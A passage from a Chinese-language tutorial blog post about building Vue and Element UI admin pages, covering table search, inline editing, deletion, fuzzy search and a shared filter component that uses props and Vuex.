class="hljs-string">&quot;u43&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u102&quot;</span>&gt;</span>学工号：<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span></span><br><span class="hljs-tag">      <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;sid&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;学 工 号&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u44&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 200&quot;</span></span><br><span class="hljs-tag">    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 添加点击事件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">round</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u45&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;search&quot;</span></span><br><span class="hljs-tag">      &gt;</span>查找&lt;/el-button<br>    &gt;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主要是使用<code>&amp;nbsp;</code>控制了一下空格间距，然后使用了element的input框</p><p>还有就是注意一下<code>el-input</code>的间距问题，因为input框是块级元素，所以的top样式值不同，第二个会比第一个低21px，所以第二个的top值需要比第一个少21px（因为top是相距顶部的距离）</p><p>然后用户页面使用了element的table做了一个可以滚动的用户列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 结果表单，操作页面插入span --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">el-table</span> <span class="hljs-attr">:data</span>=<span class="hljs-string">&quot;tableData&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u46&quot;</span> &gt;</span><br><span class="hljs-comment">&lt;!-- 序号列 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">&quot;num&quot;</span> <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;序号&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;167&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span><br>  ......<br><span class="hljs-tag">&lt;/<span class="hljs-name">el-table</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个部分最关键的还是search函数</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">search() &#123;<br>  <span class="hljs-comment">// console.log(this.name + &quot; &quot; + this.sid);</span><br>  <span class="hljs-comment">//过滤器</span><br>  <span class="hljs-keyword">this</span>.tableData = <span class="hljs-keyword">this</span>.subarr.filter((item) =&gt; &#123;<br>    <span class="hljs-comment">// 每次搜索重置数组</span><br>    <span class="hljs-comment">// console.log(this.sid);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.name == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      console.log(<span class="hljs-string">&quot;逻辑1&quot;</span>);<br>      <span class="hljs-keyword">return</span> item.sid == <span class="hljs-keyword">this</span>.sid;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.sid == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      console.log(<span class="hljs-string">&quot;逻辑2&quot;</span>);<br>      <span class="hljs-keyword">return</span> item.name == <span class="hljs-keyword">this</span>.name;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      console.log();<br>      <span class="hljs-keyword">return</span> item.sid == <span class="hljs-keyword">this</span>.sid &amp;&amp; item.name == <span class="hljs-keyword">this</span>.name;<br>    &#125;<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是对数组的一个过滤，但是过滤并不改变原数组，所以要<code>this.tableData = this.subarr.filter</code></p><p>而这个subarr是tableData的一个副本数组，这个数组放在那里是一个问题（也就是在哪里写<code>this.subarr = this.tableData;</code>）</p><p>计算属性？会导致subarr一直跟着tableData变化（计算属性的扩写形式应该可以实现）</p><p>函数中？每次触发函数都会执行这句话，还是不对</p><p>我们需要的是只触发这个语句一次，以后subarr就不改变了，作为我们数据的副本</p><p>于是我将它放在了钩子中，实现了我们的需求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>  <span class="hljs-built_in">this</span>.subarr = <span class="hljs-built_in">this</span>.tableData;<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="1-2-编辑功能"><a href="#1-2-编辑功能" class="headerlink" title="1.2  编辑功能"></a>1.2  编辑功能</h3><p>编辑功能其实是实现了<code>el-table</code>的编辑功能</p><p>这里是用插槽解决的，scope有一个属性row（ElementUI文档）,scope.row可以拿到对应行的数据</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-comment">&lt;!-- 学院列 --&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">&quot;academe&quot;</span> <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;学院&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;167&quot;</span>&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 插槽实现编辑 学院，姓名，学号，联系电话 可以更改 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;scope.row.academe&quot;</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;scope.row.iseditor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inBtn&quot;</span>/&gt;</span></span><br><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!scope.row.iseditor&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">scope.row.academe</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在列中加入了一个input框，动态绑定input框中的数据实现保存</p><p>而这个input框靠v-show控制，<code>scope.row.iseditor</code>作为表格元素的属性放入</p><p>而这个span则是起到了显示更改后数据的作用，点击保存了之后显示的就是span，如果去掉span那么就什么都不会显示</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-comment">//data</span><br>&#123;<br><span class="hljs-symbol">   num:</span> <span class="hljs-string">&quot;1&quot;</span>,<br><span class="hljs-symbol">   academe:</span> <span class="hljs-string">&quot;计算机科学学院&quot;</span>,<br><span class="hljs-symbol">   account:</span> <span class="hljs-string">&quot;123456789012&quot;</span>,<br><span class="hljs-symbol">   pwd:</span> <span class="hljs-string">&quot;**********&quot;</span>,<br><span class="hljs-symbol">   name:</span> <span class="hljs-string">&quot;葉良辰&quot;</span>,<br><span class="hljs-symbol">   sid:</span> <span class="hljs-string">&quot;123456789012&quot;</span>,<br><span class="hljs-symbol">   phone:</span> <span class="hljs-string">&quot;18181947511&quot;</span>,<br><span class="hljs-symbol">   iseditor:</span> false,<br> &#125;,<br></code></pre></td></tr></table></figure><p>然后就是保存按钮</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">&quot;oprate&quot;</span> <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;操作&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;240&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-comment">&lt;!-- scope类似一个当前行的定位 --&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 点击事件 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;opbtn&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;edit(scope.row, scope)&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">scope.row.iseditor</span> ? <span class="hljs-string">&quot;保存&quot;</span>:<span class="hljs-string">&quot;编辑&quot;</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 点击事件-待定 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;opbtn&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>重置密码<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">    <span class="hljs-comment">&lt;!-- 点击事件 --&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;opbtn&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;del(scope.row)&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>保存按钮使用三元表达式判断是保存还是编辑，判断的依据就是<code>iseditor</code>，所以我们click方法中也需要改变<code>iseditor</code>的值</p><h3 id="1-3-删除功能"><a href="#1-3-删除功能" class="headerlink" title="1.3 删除功能"></a>1.3 删除功能</h3><p>删除其实也是一个数组的过滤，只是这个过滤要改变原数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">del</span>(<span class="hljs-params">row</span>)</span> &#123;<br>  <span class="hljs-keyword">let</span> isdel = confirm(<span class="hljs-string">&quot;是否确认删除该用户？&quot;</span>);<br>  <span class="hljs-keyword">if</span>(isdel)&#123;<br>    <span class="hljs-built_in">console</span>.log(row);<br>    <span class="hljs-built_in">this</span>.tableData = <span class="hljs-built_in">this</span>.tableData.filter(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">return</span> item.sid!=row.sid<br>    &#125;)<br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p><code>sid</code>是学号，作为唯一标识符，主键，所以可以依靠<code>sid</code>判断删除</p><h2 id="2-仓库管理页面"><a href="#2-仓库管理页面" class="headerlink" title="2.仓库管理页面"></a>2.仓库管理页面</h2><p>仓库管理页面与用户管理页面类似</p><p><img src="https://s2.loli.net/2022/07/31/MBSXZ8damDrPWsu.png" alt="仓库管理页面.png"></p><p>主要是筛选条件更多，取件状态的编辑是一个select框</p><h3 id="2-1查询功能"><a href="#2-1查询功能" class="headerlink" title="2.1查询功能"></a>2.1查询功能</h3><p>首先还是需要一个副本数组，还是叫<code>subarr</code></p><p>这个的查询功能涉及到多条件的查询，而且空查询需要返回全部数据</p><p>所以第一件事是封装一个数组，然后我使用的是数组的<code>foreach</code>方法遍历数据</p><p><code>num == 0 &amp;&amp; item != &quot;&quot;</code>代表该条件是name而且不为空</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">search() &#123;<br>  <span class="hljs-keyword">this</span>.bookData = <span class="hljs-keyword">this</span>.subarr;<br>  <span class="hljs-comment">// console.log(this.name + &quot; &quot; + this.sid);</span><br>  <span class="hljs-comment">//过滤器数组</span><br>  let filarr = [<span class="hljs-keyword">this</span>.name, <span class="hljs-keyword">this</span>.bookName, <span class="hljs-keyword">this</span>.period, <span class="hljs-keyword">this</span>.statment];<br>  <span class="hljs-comment">// 过滤，过滤条件为空则返回全部数据</span><br>  filarr.forEach((item, num) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span> &amp;&amp; item != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      <span class="hljs-keyword">this</span>.bookData = <span class="hljs-keyword">this</span>.bookData.filter((book) =&gt; &#123;<br>        <span class="hljs-keyword">return</span> book.name == <span class="hljs-keyword">this</span>.name;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span> &amp;&amp; item != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      <span class="hljs-keyword">this</span>.bookData = <span class="hljs-keyword">this</span>.bookData.filter((book) =&gt; &#123;<br>        <span class="hljs-keyword">return</span> book.bookName == <span class="hljs-keyword">this</span>.bookName;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num == <span class="hljs-number">2</span> &amp;&amp; item != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      <span class="hljs-keyword">this</span>.bookData = <span class="hljs-keyword">this</span>.bookData.filter((book) =&gt; &#123;<br>        <span class="hljs-keyword">return</span> book.period == <span class="hljs-keyword">this</span>.period;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num == <span class="hljs-number">3</span> &amp;&amp; item != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>      <span class="hljs-keyword">this</span>.bookData = <span class="hljs-keyword">this</span>.bookData.filter((book) =&gt; &#123;<br>        <span class="hljs-keyword">return</span> book.statment == <span class="hljs-keyword">this</span>.statment;<br>      &#125;);<br>    &#125;<br>  &#125;);<br>&#125;,<br></code></pre></td></tr></table></figure><h4 id="2-1-1-关于el-input框的clearable属性"><a href="#2-1-1-关于el-input框的clearable属性" class="headerlink" title="2.1.1 关于el-input框的clearable属性"></a>2.1.1 关于el-input框的clearable属性</h4><p>我们这里的input输入是使用的element的el-input，而el-input有一个可清除选项，也就是加入一个clearable属性</p><p>但是直接加入clearable属性会出现 清除按钮样式错误的问题</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">//直接加入clearable选项<br>        &lt;<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span><br>          v-model=<span class="hljs-string">&quot;statment&quot;</span><br>          placeholder=<span class="hljs-string">&quot;取件状态&quot;</span><br>          id=<span class="hljs-string">&quot;u44-2&quot;</span><br>          clearable<br>        &gt;<br>        &lt;/<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span>&gt;<br></code></pre></td></tr></table></figure><p>为了解决这个问题，我们需要将left，top，width，height有关的属性使用<strong>style属性写在标签中</strong>，同时还需要将原来写在css文件中的有关样式删除</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">//修改后的写法<br>        &lt;<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span><br>          v-model=<span class="hljs-string">&quot;statment&quot;</span><br>          placeholder=<span class="hljs-string">&quot;取件状态&quot;</span><br>          id=<span class="hljs-string">&quot;u44-2&quot;</span><br>          style=<span class="hljs-string">&quot;top: -1px; width: 200px;left: 556px&quot;</span><br>          clearable<br>        &gt;<br>        &lt;/<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span>&gt;<br></code></pre></td></tr></table></figure><p>这样我们的clear按钮就不会乱窜了</p><h4 id="2-1-2-模糊查找"><a href="#2-1-2-模糊查找" class="headerlink" title="2.1.2 模糊查找"></a>2.1.2 模糊查找</h4><p>我这里的模糊查找需求比较简单，如果想搜索 中国戏剧，那我们就只用搜索<code>中国</code>，<code>中国戏</code>之类的就可以了</p><p>这里主要是用到了一个函数<code>include(parmas)</code>，parmas就是我们输入的搜索字段</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">else if (num == <span class="hljs-number">1</span> &amp;&amp; item != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>storeManage.<span class="hljs-keyword">state</span>.bookData = storeManage.<span class="hljs-keyword">state</span>.bookData.filter((book) =&gt; &#123;<br>return book.bookName.includes(<span class="hljs-keyword">state</span>.bookName)<br>    &#125;);<br></code></pre></td></tr></table></figure><h3 id="2-2修改功能"><a href="#2-2修改功能" class="headerlink" title="2.2修改功能"></a>2.2修改功能</h3><p>这里的修改是修改书籍的状态，因为书籍状态只有固定的两种，所以我就使用的select下拉框</p><p>同样通过插槽写入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">&quot;statment&quot;</span> <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;状态&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;75&quot;</span>&gt;</span></span><br><span class="xml">   <span class="hljs-comment">&lt;!-- 插槽处理状态下拉栏 --&gt;</span></span><br><span class="xml">   <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span></span><br><span class="xml">     <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&quot;取件状态&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;scope.row.iseditor&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;scope.row.statment&quot;</span>&gt;</span></span><br><span class="xml">       <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;已取&quot;</span>&gt;</span>已取<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="xml">       <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;未取&quot;</span>&gt;</span>未取<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><br><span class="xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br><span class="xml">     <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!scope.row.iseditor&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">scope.row.statment</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>主要是后面的<code>button</code>，肯定不能安装插槽来写（会因为template显示不出来），但是csdn的时候发现使用 <code>#default = &quot;scope&quot;</code>可以显示该模板而且获取到了scope，得到了scope也就是得到了每一行的值</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">default</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;change(scope.row)&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">scope.row.iseditor</span> ? <span class="hljs-string">&quot;保存&quot;</span>:<span class="hljs-string">&quot;更改&quot;</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="2-2-1-关于scope自定义列表格"><a href="#2-2-1-关于scope自定义列表格" class="headerlink" title="2.2.1 关于scope自定义列表格"></a>2.2.1 关于scope自定义列表格</h4><p>这里的<code>#default = &quot;scope&quot;</code>其实是<code>v-slot = &quot;scope&quot;</code>的简写，而这个是element-plus中自定义列表格的用法</p><p>其实这种用法上一个页面就使用过</p><p>element中自定义类表格的便是使用的</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">template</span> slot-<span class="hljs-keyword">scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;<br><br>&lt;/<span class="hljs-keyword">template</span>&gt;<br></code></pre></td></tr></table></figure><p>而这个scope我们打印一下</p><p><img src="https://s2.loli.net/2022/07/31/ytu8cqa6SKQfodj.png" alt="scope.png"></p><p>其实就是我们的vc，下面有我们的row属性，可以拿到每一行的数据</p><p>而在element-plus中我们的自定义列表格写成 <code>#defalut = &quot;scope&quot;</code></p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">template</span> #<span class="hljs-keyword">default</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;<br>  <br>&lt;/<span class="hljs-keyword">template</span>&gt;<br></code></pre></td></tr></table></figure><p>这两个就是一个版本的区别，在我的实际开发中都可以得到相同的效果</p><h2 id="3-查看订阅系统页面"><a href="#3-查看订阅系统页面" class="headerlink" title="3.查看订阅系统页面"></a>3.查看订阅系统页面</h2><p>这个页面和仓库管理页面非常相似</p><p><img src="https://s2.loli.net/2022/07/31/eSYkHIhXjlKc87d.png" alt="订阅系统页面.png"></p><p>也就代表我们可以复用的组件有很多</p><p>这里我主要是复用了筛选框组件，但是虽然说是复用 其实还是有一点差别的</p><h3 id="1-第一就是筛选条件"><a href="#1-第一就是筛选条件" class="headerlink" title="1.第一就是筛选条件"></a>1.第一就是筛选条件</h3><p>仓库页面的筛选条件有4条，这个页面的筛选条件是3条</p><p>使用我们需要判断，这个组件究竟是用在了仓库页面还是订阅系统页面，判断条件交由<code>v-show</code></p><p>进行这个判断我们第一个想到的就是父组件向子组件传值—<code>props</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">  <span class="hljs-regexp">//</span>订阅系统组件<br>  &lt;filterMid :flag=<span class="hljs-string">&quot;flag&quot;</span>&gt;&lt;/filterMid&gt;<br>  <br>  <span class="hljs-regexp">//</span> 数据 <br> data() &#123;<br>  return &#123;<br>    <span class="hljs-regexp">//</span>其他数据已放入vuex<br>    flag: <span class="hljs-number">0</span>,<br>  &#125;;<br>&#125;,<br></code></pre></td></tr></table></figure><p>然后使用v-show进行一个简单的显示与隐藏</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">//取件状态栏</span><br>&lt;span id=<span class="hljs-string">&quot;u102-2&quot;</span> v-<span class="hljs-keyword">show</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;取件状态：&lt;/span&gt;<br>&lt;el-input<br>  v-<span class="hljs-keyword">show</span>=<span class="hljs-string">&quot;flag&quot;</span><br>  v-model=<span class="hljs-string">&quot;<span class="hljs-subst">$store</span>.state.statment&quot;</span><br>  placeholder=<span class="hljs-string">&quot;取件状态&quot;</span><br>  id=<span class="hljs-string">&quot;u44-2&quot;</span><br>  style=<span class="hljs-string">&quot;top: -1px; width: 200px; left: 536px&quot;</span><br>  clearable<br>&gt;<br></code></pre></td></tr></table></figure><h3 id="2-第二就是用于筛选的数据"><a href="#2-第二就是用于筛选的数据" class="headerlink" title="2.第二就是用于筛选的数据"></a>2.第二就是用于筛选的数据</h3><p>因为数据放在vuex中，因为我们需要考虑能不能筛选框在两个组件中都使用同一组数据</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;$store.state.name&quot;</span><br><span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;$store.state.bookName&quot;</span><br><span 